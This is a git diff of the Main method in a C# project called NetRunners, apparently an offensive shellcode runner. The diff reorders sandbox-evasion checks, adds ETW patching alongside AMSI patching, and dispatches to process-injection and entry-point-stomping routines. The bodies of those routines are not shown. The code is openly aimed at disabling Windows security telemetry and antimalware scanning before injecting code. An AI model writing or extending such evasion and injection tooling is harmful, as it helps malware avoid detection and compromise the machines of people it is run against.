@@ -16,19 +16,21 @@ namespace NetRunners
         /// <param name="-eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
         static void Main(string[] args)
         {
-            // call heuristic functions
-            if ((Sleep()) || (NonEmulated()))
-            {
-                return;
-            }
-            patchAmsi(); // patch amsi
-
+           
             // check args number
             if (args.Length > 1)
             {
                 Console.WriteLine("Error: Only one argument is allowed max.");
                 return;
             }
+            // call heuristic functions
+            if ((!Sleep()) || (!NonEmulated()))
+            {
+                return;
+            }
+            // call patchers
+            if ((!PatchEtw()) || (!PatchAmsi()))
+                return;
 
             // Determine the function call based on the argument provided, case insensitive
             string call = args.Length == 1 ? args[0] : string.Empty;
@@ -37,12 +39,12 @@ namespace NetRunners
                 // process injection runner
                 case "-pi":
                     Console.WriteLine("[+] Process Injection selected!");
-                    piRun();
+                    PiRun();
                     break;
                 // entrypoint stomping runner
                 case "-eps":
                     Console.WriteLine("[+] EntryPoint Stomping selected!");
-                    epsRun();
+                    EpsRun();
                     break;
                 // simple runner
                 default:
